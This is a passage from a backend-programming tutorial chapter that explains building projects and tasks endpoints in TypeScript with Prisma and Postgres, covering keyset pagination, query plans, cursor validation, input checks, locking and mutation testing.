src/modules/tasks/tasks.schemas.ts         # task bodies, and the filter and sort allow-lists
src/modules/tasks/tasks.query.ts           # small pure functions that build the list query
src/modules/tasks/…                        # tasks: service, routes
test/pagination.test.ts                    # unit tests: cursors, dates, query building (no DB)
test/projects.test.ts, test/tasks.test.ts  # endpoints, roles, IDOR, races
test/task-lists.test.ts                    # filters, sorting, and walking through every page
```

`workspaces.policy.ts` gained three actions, `workspaces.access.ts` a shared lock and
advisory locks that wait in a fair queue (Concept 11), and removing a member now unassigns
their tasks.

### Concept 1: Nested resources stay inside their tenant

A task's URL names its workspace, its project and the task itself, and every lookup uses
all of those ids:

```ts
// projects.access.ts: the project must be in THIS workspace
db.project.findUnique({ where: { id_workspaceId: { id: projectId, workspaceId } } });
```

A project id from another workspace simply isn't found (404). That's the IDOR defense from
chapter 4 (Concept 5), one level deeper. The test "never reaches another workspace's
project through your own workspace" logs in as the owner of one workspace and tries the
project and task endpoints with a project id from another one.

**Copying `workspace_id` onto tasks.** A task belongs to a project, which belongs to a
workspace, so `tasks.workspace_id` repeats what `tasks.project_id` already implies. Storing
a copy like that is called **denormalization**. It lets a query find tasks by workspace
directly: removing a member unassigns all their tasks in the workspace with one indexed
update. The usual risk of a copy is that it goes wrong. Here the database rules that out:

```sql
FOREIGN KEY (project_id, workspace_id) REFERENCES projects (id, workspace_id)
```

The foreign key covers **both** columns, so a task's pair must match a real project _in
that workspace_. For that, `projects` needs a unique index on `(id, workspace_id)`
(`@@unique([id, workspaceId])` in the Prisma schema).

### Concept 2: Why paginate, and why not with OFFSET

A project can hold 5,000 tasks. Returning them all in one response would be slow for the
server, the network and the client, so lists come one **page** at a time.

The textbook way is **offset pagination**: `?page=126` becomes `LIMIT 20 OFFSET 2500`. It
has two problems:

1. **It gets slower the further you go.** The database can't jump to row 2,500: it has to
   find the first 2,500 rows and throw them away. `EXPLAIN ANALYZE` on a project with
   5,000 tasks:

   ```
   Limit (actual rows=21)
     ->  Sort (actual rows=2521)
           ->  Bitmap Heap Scan on tasks (actual rows=5000)
   ```

   All 5,000 tasks were read and sorted, to return 21 of them.

2. **Pages shift under you.** If someone adds a task while you're reading page 1,
   everything moves down one place, and the last task of page 1 shows up again at the top
   of page 2. If someone deletes one, a task is skipped and you never see it.

**Keyset pagination** (also called **cursor pagination**) asks a different question.
Instead of "skip 2,500 rows", it asks "give me the rows _after the last one I saw_". If the
list is sorted by creation time and the last task you received was created at
`00:41:40`, the next page is the tasks created after that. An index on
`(project_id, created_at)` finds that spot directly, the way you open a dictionary at "M"
without reading A to L first. Page 1 and page 126 cost the same. And tasks added or deleted
elsewhere don't move your position, because the position is a _value_, not a count.

The price: there's no "jump to page 126", only "next page", and the API doesn't return a
total (counting reads every row, which is exactly what we wanted to avoid). For feeds,
infinite scrolling and syncing, that's the right trade, and it's how most large APIs
paginate (Stripe, Slack, and GitHub's GraphQL API, for example).

**Ask for one more row.** To know whether there's a next page, the service asks the
database for `limit + 1` rows (`take: query.limit + 1`). Then `toPage()` turns them into a
page: if the extra row came back, a next page exists, and the cursor points at the last row
actually returned. The extra row itself isn't returned.

### Concept 3: The order must be total: add the id as a tiebreaker

"The tasks created after 00:41:40" breaks as soon as two tasks share a `createdAt`.
Timestamps tie more often than you'd think: a bulk import, or two requests in the same
millisecond. If the order of tied rows isn't defined, the database may return them in any
order, so a page boundary that falls inside a tie can skip or repeat tasks.

The fix: sort by `createdAt` **and then by `id`**. No two tasks share an id, so the order is
**total**: every task has exactly one place in it. The cursor stores both values, and
"after" means:

```
createdAt > v  OR  (createdAt = v AND id > lastId)
```

The paging tests insert three tasks with the same `createdAt` on purpose, then walk the list
with page sizes 1, 2, 3, 4, 7 and 10, so that page boundaries fall inside the tie. Every
walk must return every task exactly once, in the expected order. Without the tiebreaker,
the test fails.

### Concept 4: Write the condition so the index can use it

The condition above is correct, but Postgres can't use the index well with it. Here it is
halfway through a list of 5,000 tasks:

```
Index Scan using tasks_project_id_created_at_id_idx on tasks (actual rows=21)
  Index Cond: (project_id = '…')
  Filter: ((workspace_id = '…') AND ((created_at > '…') OR ((created_at = '…') AND (id > '…'))))
  Rows Removed by Filter: 2500
```

One index scan reads one continuous stretch of the index, and an `OR` of two conditions
isn't one stretch. So Postgres read the project's tasks from the beginning and threw away
the first 2,500: as slow as `OFFSET`. Our code writes the same condition differently:

```
createdAt >= v  AND  (createdAt > v OR id > lastId)
```

It selects exactly the same rows. (Check it: a row with `createdAt > v` passes both forms;
a row with `createdAt = v` passes both only if `id > lastId`; an earlier row fails both.)
But its first half is a place Postgres can start reading from:

```
Index Scan using tasks_project_id_created_at_id_idx on tasks (actual rows=21)
  Index Cond: ((project_id = '…') AND (created_at >= '…'))
  Filter: ((workspace_id = '…') AND ((created_at > '…') OR (id > '…')))
  Rows Removed by Filter: 1
```

One row thrown away instead of 2,500: only the ties at exactly `v` are read for nothing.
`afterTimestamp()` in `tasks.query.ts` builds this condition. (The `Filter` also checks
`workspace_id`, which every query adds (Concept 1) and this index doesn't hold. All of a
project's tasks are in one workspace, so that check never throws anything away.)

For `order=desc`, every comparison flips (`<=`, `<`) and Postgres reads the same index
**backward** (`Index Scan Backward` in the plan), so one index serves both directions.
There's one index per way of sorting, `(project_id, created_at, id)`,
`(project_id, updated_at, id)` and `(project_id, due_date, id)`, and each starts with
`project_id` because a list is always inside one project.

**Read the plan, don't guess.** `EXPLAIN ANALYZE <query>` runs a query and shows how
Postgres executed it: which index, the `Index Cond` (the stretch of the index it read) and
the `Filter` (rows it read, then threw away). "Rows Removed by Filter" is the number to
watch.

### Concept 5: Missing values (NULL) need a plan

Due dates are optional. Where do tasks without one go? We decided: **always last**, in both
directions, because "no deadline" is never the most urgent.

Postgres sorts `NULL` as if it were larger than any value: last in ascending order, but
_first_ in descending order. Prisma can ask for `nulls: 'last'`, and for ascending order
that matches the index. For descending order nothing matches, and we measured what
Postgres does then: it reads all 5,000 tasks of the project and sorts them, for a page of 21.

The "after" condition has the same problem. A list that ends with the `NULL`s needs an
`OR`:

```
due_date > v  OR  (due_date = v AND id > lastId)  OR  due_date IS NULL
```

Measured: `Rows Removed by Filter: 1311`. Again, no single stretch of the index.

So `TaskService` reads a page sorted by due date from **two stretches** of the
`(project_id, due_date, id)` index, one after the other:

1. The tasks **with** a due date, after the cursor, in date order. If they fill the page,
   that's it.
2. Otherwise, the rest of the page comes from the tasks **without** a due date, ordered by
   id. In the index, the `NULL`s sit together at one end, sorted by the next column (`id`),
   so they are a stretch too.

**Ask for the order the index has.** The first version sorted that second read by `id`
alone. Every due date in it is `NULL`, so sorting by the due date first changes nothing,
or so it seems. But Postgres only treats a column as fixed when the condition is `=`, and
`due_date IS NULL` isn't one. So it didn't know that the undated tasks are already in id
order in the index, and walked the primary key instead, through the tasks of every project:

```
Index Scan using tasks_pkey on tasks (actual rows=21)
  Filter: ((due_date IS NULL) AND (project_id = '…') AND (workspace_id = '…'))
  Rows Removed by Filter: 1924
```

Sorted by `due_date, id`, the order the index is in, it reads exactly the stretch it needs
(here, after a cursor):

```
Index Scan using tasks_project_id_due_date_id_idx on tasks (actual rows=21)
  Index Cond: ((project_id = '…') AND (due_date IS NULL) AND (id > '…'))
  Filter: (workspace_id = '…')
```

Both return the same rows in the same order, so no test can tell them apart; only the plan
shows the difference. `dueDateOrder()` in `tasks.query.ts` gives both reads the index's
order, and its comment says why, so that nobody "simplifies" it back.

When a page ends among the undated tasks, the cursor's value is `null`, and the next page
only reads the second stretch. Page boundaries right at the switch from dated to undated
tasks are covered by the "walk every page" tests.

**Two reads, one snapshot.** By default, each SQL statement sees the database as it is
when that statement starts. So between our two reads, another request could set or clear
a task's due date and commit, and one page would then hold that task twice (once in each
stretch) or not at all. The review reproduced it: while due dates changed, 5 to 26 pages
out of 1,200 came back wrong. The fix runs both reads in one transaction at the
**`REPEATABLE READ`** isolation level, where every statement sees the same **snapshot**:
the database as it was at the transaction's first read. Reads never block writes in
Postgres, so this costs nothing but the `BEGIN` and `COMMIT`. The test "reads a due-date
page from one snapshot" changes four due dates while five pages are read, twenty times
over; with two separate snapshots, it fails in the first rounds.

### Concept 6: The cursor is opaque, not secret, and validated

The cursor is JSON (the list it belongs to, the sort, the order, the last task's sort value
and its id), encoded as **base64url** so it's safe to put in a URL:

```
{"scope":"tasks:7c1e4a52-…","sort":"dueDate","order":"asc","value":"2026-12-01","id":"0b9d6c43-…"}
  → eyJzY29wZSI6InRhc2tzOjdjMWU0YTUyLTNkNTUtNGYwZS04YTc3LTJiOWU2ZjFkMGMzMyIsInNvcnQiOi…
```

- **Opaque:** clients must not build or change it, only send it back. That leaves us free
  to change what's inside later.
- **Not secret:** anyone can decode base64. That's fine, because the cursor holds nothing
  the client didn't already see in the page. It isn't signed either, so an edited cursor
  that is still valid is accepted; all it can change is where the client resumes a list it
  may read anyway. (If it had to be tamper-proof, we would sign it with an HMAC, like a
  JWT.)
- **It carries values, not only an id.** "After task X" would need task X to still exist.
  With the values, a cursor keeps working even if that task was deleted in the meantime
  (tested).
- **Validated like any input.** Base64 that isn't JSON, JSON of the wrong shape, an id that
  isn't a uuid, a value that isn't a timestamp: all `400 INVALID_CURSOR`.
- **It only works for the list it came from.** The cursor records its list (the `scope`:
  `tasks:<projectId>` or `projects:<workspaceId>`) and the sort and order it was made for.
  A cursor from another project's tasks, or from a list sorted another way, is refused,
  instead of silently returning a page that makes no sense. (The first version only
  checked the sort and order; the review found that a cursor from another project, sorted
  the same way, was accepted.) Both sides of that comparison must spell the id the same
  way, which is why ids are lower-cased on the way in (Concept 12).
- **Its values are checked, too.** A tampered cursor with the date `0000-01-01` is valid
  ISO 8601, but Postgres has no year 0 and would fail the query: a `500`. So cursor
  timestamps must be from 1970 on and dates from 1900 on. The test "refuses a tampered
  cursor with year 0, with 400 and not 500" is there because of this.

Filters aren't stored in the cursor, so a client should send the same filters with every
page. (Exercise 7 asks what it would take to enforce that too.)

### Concept 7: Filtering and sorting with allow-lists

Every filter and sort is spelled out in the Zod schema: `sort` must be one of three field
names, `status` one of three values, and so on. Nothing from the query string ever becomes
a column name or SQL text. That's an **allow-list**: we list what's allowed, and anything
else is a `400`. (The opposite, a block-list, tries to list what's forbidden, and always
forgets something.)

- **Lists:** `status=TODO,IN_PROGRESS` is split on the commas and each item is checked
  against the enum. A list has at most 3 items and 100 characters.
- **Ranges:** `dueFrom` and `dueTo` both include their day, and a `dueFrom` after `dueTo`
  is a `400`: a clear error beats a mysteriously empty list.
- **Filters add up:** each one adds a condition, and a task must match all of them
  (`taskFilters()` in `tasks.query.ts`).

**Search, and a trap in LIKE.** `q=report` becomes `title ILIKE '%report%'`. In `LIKE`
patterns, `%` means "any text" and `_` means "any one character". Prisma's `contains` does
**not** escape them. We checked: a search for `100%` also found "100 apples", and `a_b`
found "axb". `escapeLike()` puts a backslash before `%`, `_` and the backslash itself, and
the tests search for exactly those titles.

A `%…%` search can't use a normal index, so it reads every task of the project (at most
`MAX_TASKS_PER_PROJECT`). Exercise 3 makes it fast with a trigram index.

### Concept 8: A due date is a day, not a moment

`createdAt` is a **moment**: `2026-11-19T16:31:05.123Z`, the same instant everywhere on
Earth. A due date is a **calendar day**: "December 31st". If we stored it as a moment,
midnight UTC on the 31st would still be the 30th in New York, and a client there would show
the wrong day.

So `due_date` is a Postgres `DATE` column (no time, no time zone), and the API sends and
receives `"2026-12-31"`. Prisma represents a `DATE` as a JavaScript `Date` at midnight UTC;
`dateFromIso()` and `isoFromDate()` in `src/lib/dates.ts` convert both ways, and no other
code needs to know.

The `IsoDay` schema checks that the day exists (`2028-02-29` is fine, `2026-02-29` and
`2026-02-30` are not) and is from 1900 on.

### Concept 9: PATCH: a missing field and `null` mean different things

`PATCH` changes only the fields you send. For a field that can be empty, JSON can say three
different things:

```
{ "title": "New title" }       dueDate is missing: keep it as it is
{ "dueDate": null }            clear it
{ "dueDate": "2026-12-31" }    set it
```

The API keeps that difference: a missing field is left alone, and `null` clears the due
date or the assignee. A `PATCH` with nothing to change (`{}`, or only unknown fields) is a
`400` instead of a silent no-op.

With `exactOptionalPropertyTypes` (chapter 3), TypeScript won't let `{ title: undefined }`
slip through to Prisma by accident: `taskChanges()` adds a field to the update only if it
was sent.

### Concept 10: Who may do what, including "it's mine"

| Action                          | Who                                                 |
| ------------------------------- | --------------------------------------------------- |
| Read projects and tasks         | Every member                                        |
| Create, rename, delete projects | ADMIN and OWNER (`projects:manage`)                 |
| Create and edit tasks           | Every member (`tasks:write`)                        |
| Delete a task                   | Its creator, or ADMIN and OWNER (`tasks:deleteAny`) |

The last row is an **ownership-based** rule: it depends on the task, not only on your role.
The role part stays in the policy table, and the service adds "or you created it":

```ts
if (task.createdById !== userId && !can(membership.role, 'tasks:deleteAny')) {
  throw Errors.forbidden('Only the creator of a task, or an admin, can delete it');
}
```

### Concept 11: Shared and exclusive locks, a fair queue, and a fixed lock order

Chapter 4's rule was "lock, then check, then write", and it applies here too. But task edits
are frequent and come from every member, and making them wait for one another would be
wasteful. So the workspace lock comes in two strengths:

| Lock                             | How many at once | Used by                                                             |
| -------------------------------- | ---------------- | ------------------------------------------------------------------- |
| `lockWorkspace()` (exclusive)    | one transaction  | membership and role changes, workspace renames, creating a project  |
| `lockWorkspaceShared()` (shared) | many             | editing and deleting projects; creating, editing and deleting tasks |

The two conflict: while any task write holds the shared lock, no membership or role can
change, and the other way round. That keeps true, until we commit, what we checked at the
start: that the caller is still a member with the right role, and that the new assignee is
still a member.

That last one is an invariant: **a task is only ever assigned to a member**. Removing a
member unassigns their tasks, in the same transaction. Without the shared lock, this could
happen:

```
assign request:  is Dana a member? yes ✓ .............................. insert task for Dana ✓
remove request:  ............. delete Dana's membership, unassign her tasks ✓
```

The remove request couldn't see the new task (it wasn't committed yet), so the task stayed
assigned to someone who's no longer a member. The test "never leaves a task assigned to
someone who is no longer a member, even under a race" removes Dana while four requests
assign her, four times over. Without the shared lock, it failed in 5 runs out of 5.

**A shared lock can starve an exclusive one.** The first version used row locks on the
workspace's row: `FOR SHARE` for task writes, `FOR UPDATE` for membership changes. The
second review found the trap in that. Postgres row locks don't wait in line: a new
`FOR SHARE` joins the transactions that already share the row at once, even while a
`FOR UPDATE` is waiting for them to finish. So the exclusive lock only gets in at an
instant when nobody holds the shared one, and with a steady stream of task edits, that
instant never comes. The review measured it: while Carol edited one task from three loops
at once, the owner couldn't remove her. The removal waited until the 10-second timeout and
failed with a `500`. Requests from an outsider could hold up a rename the same way. This is
called **starvation**: nothing is stuck for good, but one waiter never gets its turn.

The fix is an **advisory lock**: a lock on a number that we choose, managed by Postgres
like its other locks and released at `COMMIT` or `ROLLBACK`
(`pg_advisory_xact_lock_shared()` and `pg_advisory_xact_lock()`). These locks wait in a
**fair queue**: once an exclusive request is waiting, new shared requests wait behind it.
The same test now removes Carol in about 20 ms, and still in about 70 ms with 24 loops of
edits. The number comes from the workspace's id (a fixed first number that says "a
workspace", then a hash of the id). Two workspaces whose ids hash to the same number would
wait for each other now and then: slower, never wrong. The test "lets the owner remove a
member who keeps editing a task: the locks are fair" fails with the row locks, in 3 runs
out of 3.

The same trap can't catch `lockProject()` and `lockTask()`: every transaction that locks
those rows asks for the same strength, `FOR UPDATE`, and transactions waiting for the same
exclusive row lock wait in line. It takes two strengths on one row, from different
transactions, to starve one of them. (Exercise 10 looks at the one place where that still
happens.)

**Exclusive locks where a count matters.** Quotas are counted under an exclusive lock, as
in chapter 4: the workspace's before counting projects, and the project row
(`lockProject()`) before counting tasks. Two task creations in the same project wait for
each other; in different projects, they don't.

**Lock the row you're about to change.** Editing or deleting a task first locks it
(`lockTask()`, which looks it up by workspace, project and task id). That's also the
existence check, so a delete racing an edit gets a clean `404` instead of failing halfway
with a `500`. In the same way, a task created while its project is being deleted gets a
`404` or is deleted with the project (tested). With `lockProject()` reduced to a plain
lookup, that test saw `500`s in every run.

**Lock order: workspace, then project, then task.** Every transaction takes its locks in
that order, so two transactions can never each hold a lock the other is waiting for (the
deadlock from chapter 4). Postgres also takes locks you didn't ask for: inserting a task
checks its foreign keys with a light `FOR KEY SHARE` lock on the project row and on the
users it references. Those come at the end, so they keep the order.

### Concept 12: The Power of Ten rules in this chapter

**Rule 3: everything has a bound.**

| What                   | Bound                             | Where                                   |
| ---------------------- | --------------------------------- | --------------------------------------- |
| Page size              | default 20, at most 100           | `LIMITS.pageSizeDefault`, `pageSizeMax` |
| Cursor length          | 512 characters                    | `LIMITS.cursorMaxLength`                |
| Projects per workspace | 20 (at most 1,000)                | `MAX_PROJECTS_PER_WORKSPACE`            |
| Tasks per project      | 5,000                             | `MAX_TASKS_PER_PROJECT`                 |
| Tasks per workspace    | projects × tasks, at most 100,000 | `LIMITS.tasksPerWorkspaceMax`           |

The task list is paginated, so its quota may go above `LIMITS.listMax`: the page size
bounds the response, and the quota bounds storage and the cost of a search. Even the test
helper that follows `nextCursor` gives up after 100 pages, so a bug can't make it loop
forever (rule 2).

**Quotas multiply.** The first version allowed 100 projects of 5,000 tasks: 500,000 tasks
in one workspace. The review measured what that means for removing a member, which
unassigns all their tasks in one statement while the workspace is locked: 8.3 seconds for
a member assigned to 500,000 tasks, close to the 10-second statement timeout. A little more
and that member could never be removed. So `env.ts` now refuses settings where projects
per workspace times tasks per project is above 100,000, and the default is 20 projects. At
100,000 tasks, the same removal took about 1.5 seconds. A bound on each part isn't enough;
what a request has to touch is what needs the bound.

**Rule 5: assert what can't happen.** `toPage()` asserts that the query returned at most
`limit + 1` rows. More would mean the query is wrong, and quietly cutting the list would
hide that bug.

**Rules 4 and 9: small, simple functions.** The list query is built from small pure
functions in `tasks.query.ts` (filters, order, "after the cursor"), each easy to read and
to test without a database. ESLint allows at most four parameters, so the ids from the URL
travel as one object (`ProjectRef`, `TaskRef`), straight from Fastify's `request.params`.

**Rule 7: check every input.** Comma-separated lists are checked item by item, and dates for
existence and range. `test/input-bounds.test.ts` now covers the project and task schemas
too (a `date` string has a fixed length, like a `uuid`).

Every string a client sends now also refuses the **NUL character** (`U+0000`, `%00` in a
URL). It's valid JSON and valid Unicode, but Postgres text can't hold it, so a title or a
search with one failed in the database: a `500`. The review found it in every text field,
including the workspace and user names of earlier chapters. Input schemas now start from
`Text` (`src/lib/text.ts`) instead of `z.string()`, and `input-bounds.test.ts` sends a NUL
to every free-text field of every input schema and expects the `400`.

The second review found two more things about strings:

- **Half a character.** JavaScript strings are UTF-16, where some characters, like most
  emoji, take two code units: a **surrogate pair**. JSON can send one half on its own
  (`"\uD800"`), which is no character at all. The database driver quietly turned it into
  `�` (U+FFFD), so the API answered `201` with a different title than the one it was sent.
  `Text` now refuses it too (`isWellFormed()`), and the input test sends it to every field.
- **One exception, on purpose: the login password.** Before `Text`, sign-up took any
  string, so an account may have a password with a NUL in it. A login that refused such a
  password would lock that account out for good (there's no password reset yet), and the
  NUL was never a problem there: a password is only hashed and compared, never stored. So
  the login takes any string. The rule behind it: **checks on new data may get stricter,
  but checks against old data must accept what was once allowed.** The test keeps the
  exception in a list with its reason, so it can't spread quietly: 22 fields are checked,
  and 1 is exempt.

**One spelling per id.** Ids from clients are checked as uuids and lower-cased on the way
in (`Id` in `src/lib/ids.ts`). Postgres compares uuids by value, so an id in capitals finds
the same row. But our code also compares ids as text: "is the member being removed the
caller?", "was this cursor made for this list?". The second review found both going wrong
when a client writes uuids in capitals (some do, like Swift's `uuidString`): page 2 of a
list failed with `INVALID_CURSOR`, and a member leaving the workspace got a `403`. Turning
every input into one **canonical form** at the edge means no comparison inside has to
think about it.

### What the review found

Before the pull request, the code was reviewed from three angles (pagination, concurrency
and security), and every finding was reproduced before it was fixed:

| Found                                     | What could happen                                                                                       | Fix                                                                |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
| A due-date page read with two statements  | A task whose due date changed in between was on the page twice, or missing (5 to 26 pages in 1,200)     | Both reads in one `REPEATABLE READ` transaction (Concept 5)        |
| The NUL character in a text field         | A `500` instead of a `400`, in every text field, the names of earlier chapters included                 | `Text` instead of `z.string()` for every input string (Concept 12) |
| Cursors only checked their sort and order | A cursor from another project's tasks, sorted the same way, was accepted                                | The cursor records its list (Concept 6)                            |
| 100 projects × 5,000 tasks per workspace  | Removing a member assigned to 500,000 tasks took 8.3 of the 10 seconds allowed                          | At most 100,000 tasks per workspace (Concept 12)                   |
| Tests that expected creation order        | Two rows created in the same millisecond are ordered by their random ids, so a test failed now and then | Tests set the timestamps themselves, or compare sets               |

The review also tried these, and found nothing: random and malformed input on every
endpoint (no other `500`s), many requests racing in one workspace (no deadlock, no broken
invariant), and a role change waiting behind heavy task traffic (about 40 ms). That last
one was wrong, as the second review showed: it found the traffic that does block it.

The last row is worth remembering. A test that fails "now and then" is a **flaky test**, and
it's a bug report about the test: here, it assumed that rows created one after the other
get different timestamps. They usually do, which is exactly why it took a while to show.

After those fixes, a second, shorter review went over the code again, reproducing each
finding, and checked this chapter against the code:

| Found                                     | What could happen                                                                                    | Fix                                                        |
| ----------------------------------------- | ---------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
| Shared row locks don't wait in line       | A member editing a task from three loops kept the owner from removing them: a `500` after 10 seconds | Advisory locks, which keep a fair queue (Concept 11)       |
| Ids compared as text, as the client typed | With ids in capitals, page 2 of a list was `400 INVALID_CURSOR`, and leaving a workspace a `403`     | Ids are lower-cased on the way in (Concept 12)             |
| The undated tasks read in id order        | Postgres walked the primary key through every project's tasks: 1,924 rows read and dropped for 21    | Read them in the index's order, `due_date, id` (Concept 5) |
| Half of a surrogate pair accepted         | Stored as `�`: a `201`, and a title other than the one sent                                          | `Text` refuses it (Concept 12)                             |
| The login password refused NUL            | An account whose password had a NUL could never log in again                                         | Any string at login (Concept 12)                           |

It also corrected this chapter: the plans in Concept 4 had been simplified and are now the
measured ones, `toPage()` doesn't query the database (the service does), and SECURITY.md
said that an edited cursor gets a `400`, though one that is edited and still valid is
accepted (Concept 6). While fixing all this, we checked one more lock and found nothing: a
user's session refresh, while eight loops assigned tasks to them, waited about 20 ms
(Exercise 10).

The first row is the one to remember from this review. The first review had measured a
role change behind heavy traffic, and it was fast; the second sent a different kind of
traffic, requests that queue for one task while already holding the shared lock, so that
their shared locks always overlap. **A test that passes only shows that this one way of
trying found nothing.**

### How we know the tests work

A test proves only what it checks. So each important test was run against the bug it's
meant to catch: we put the bug in on purpose, ran the test, and took the bug out again.

| Bug put in on purpose                                         | Caught by                                   |
| ------------------------------------------------------------- | ------------------------------------------- |
| No shared lock on the workspace                               | the assignment-vs-removal race (5 out of 5) |
| `lockProject()` reduced to a lookup without a lock            | task creation vs project deletion (`500`s)  |
| Projects counted under the shared lock, not the exclusive one | the project quota race (3 out of 3)         |
| Tasks counted without locking the project                     | the task quota race (3 out of 3)            |
| Due-date pages never reading the tasks without a due date     | the "walk every page" test                  |
| Undated tasks paged in the wrong id direction                 | the "walk every page" test                  |
| No id tiebreaker                                              | the "walk every page" test                  |
| The cursor pointing at the extra row, not the last one        | the "walk every page" test                  |
| Each due-date read with its own snapshot (`READ COMMITTED`)   | the one-snapshot race (5 out of 5)          |
| The cursor's list (`scope`) not checked                       | the tests with a cursor from another list   |
| A project name or `q` accepting the NUL character             | the NUL tests (`500` instead of `400`)      |
| No bound on projects × tasks                                  | the environment validation test             |
| Row locks (`FOR SHARE`, `FOR UPDATE`) for the workspace again | the fair-lock test (`500`, 3 out of 3)      |
| The exclusive workspace lock taken as a shared one            | the two-owners-leave race (3 out of 3)      |
| Ids not lower-cased                                           | the tests with ids in capitals              |
| `Text` accepting half of a surrogate pair                     | the input tests (`201` instead of `400`)    |
| The login password refusing the NUL character                 | the login test with an old password         |

This is called **mutation testing**: change the code in a small, wrong way (a "mutant")
and check that some test fails. A mutant that survives points at a missing test. The query
plans in Concepts 2, 4 and 5 were measured the same way, with `EXPLAIN ANALYZE` on 20
projects of 5,000 tasks each, instead of assumed.

One mutant survives on purpose: reading the undated tasks in id order (Concept 5) returns
the same rows in the same order, so no test can catch it. Some things only a measurement
shows. For those, the code says why it's written that way, and the measurement is written
down next to it.

### Build it yourself

1. Add `Project` and `Task` to the schema with the composite foreign key, migrate, and read
   the SQL. Try to insert a task whose `workspace_id` doesn't match its project's.
2. Write projects first (create, read, rename, delete) with their role checks, and the IDOR
   test with a project from another workspace.
3. Add tasks, still without the list. Test "assign someone who isn't a member" (400) and the
   delete rule (creator or admin).
4. Add the list with `OFFSET` first. Insert 5,000 tasks with SQL and compare
   `EXPLAIN ANALYZE` for page 1 and page 126. Then switch to keyset pagination and compare
   again.
5. Write the "walk every page" test with tied timestamps, and watch it fail without the id
   tiebreaker.
6. Add `sort=dueDate`, first as one query with `nulls: 'last'`, and read its plan in
   descending order. Then split it into the two stretches.
7. Add the filters, one test each. Search for `100%` before and after `escapeLike()`.
8. Without `lockWorkspaceShared()`, run the race test that removes a member while assigning
   them tasks, and watch the invariant break. Then add the lock.
9. Make the workspace locks row locks: `SELECT id FROM workspaces WHERE id = $1 FOR SHARE`
   in `lockWorkspaceShared()`, and `FOR UPDATE` in `lockWorkspace()`. Run "lets the owner
   remove a member who keeps editing a task", and watch the removal fail after 10 seconds.
   Then put the advisory locks back.

### Exercises

1. **Total count.** Clients want "showing 20 of 1,234". Add `?include=total`, which also
   returns how many tasks match. Why should it be optional? What does it cost with
   100,000 tasks?
2. **My tasks.** Add `GET /workspaces/:id/tasks?assigneeId=me`, across all projects. Which
   index serves it? Do you need a new one?
3. **Fast search.** Enable the `pg_trgm` extension, add a GIN trigram index on `title`, and
   compare `EXPLAIN ANALYZE` for `q=report` before and after.
4. **Move a task.** Let `PATCH { "projectId": … }` move a task to another project in the
   same workspace. Which locks, in which order? What does the composite foreign key do if
   someone tries to move it into another workspace's project?
5. **A cheaper quota.** Counting tasks reads up to `MAX_TASKS_PER_PROJECT` index entries per
   creation. Keep a `task_count` column on projects instead. What must update it, and what
   makes sure it stays right?
6. **Row comparison.** Postgres can compare rows: `(created_at, id) > ($1, $2)` reads one
   stretch of the index with no filter at all (try it with `EXPLAIN ANALYZE`). Prisma can't
   express it. Is it worth a raw SQL query? What about `order=desc`, and the due date with
   its `NULL`s?
7. **Filters in the cursor.** Today, changing the filters between pages goes unnoticed. Put
   a hash of the filters in the cursor and refuse a mismatch. Is it worth it?
8. **Previous page.** Add `prevCursor`. Hint: query in the opposite order, then reverse the
   rows.
9. **Sort by priority.** Postgres orders an enum by its declaration: `LOW < MEDIUM < HIGH`.
   What would the cursor's `value` be, and which index would you need?
10. **Two strengths on one row.** `lockUser()` takes `FOR UPDATE` on a user's row, and
    assigning a task to that user takes `FOR KEY SHARE` on the same row (the foreign key
    check). Could a stream of assignments hold up that user's token refresh, the way task
    edits held up a removal? Write the test; we measured about 20 ms. Why is it so
    different from Concept 11's case? Would `FOR NO KEY UPDATE` be enough for what
    `lockUser()` protects?

### Words to know

nested resource · denormalization · composite foreign key · pagination · offset pagination ·
keyset (cursor) pagination · tiebreaker · total order · index scan · `EXPLAIN ANALYZE` ·
index condition vs filter · backward index scan · `NULLS FIRST` / `NULLS LAST` · opaque
cursor · base64url · allow-list vs block-list · `LIKE` wildcards and escaping · calendar date
vs timestamp · `PATCH` semantics (missing vs `null`) · ownership-based permission · shared
vs exclusive lock · row lock (`FOR SHARE`, `FOR UPDATE`) · advisory lock · starvation and
fair queue · lock order · isolation level (`READ COMMITTED`, `REPEATABLE READ`) · snapshot ·
NUL character · UTF-16 surrogate pair · canonical form · mutation testing · flaky test
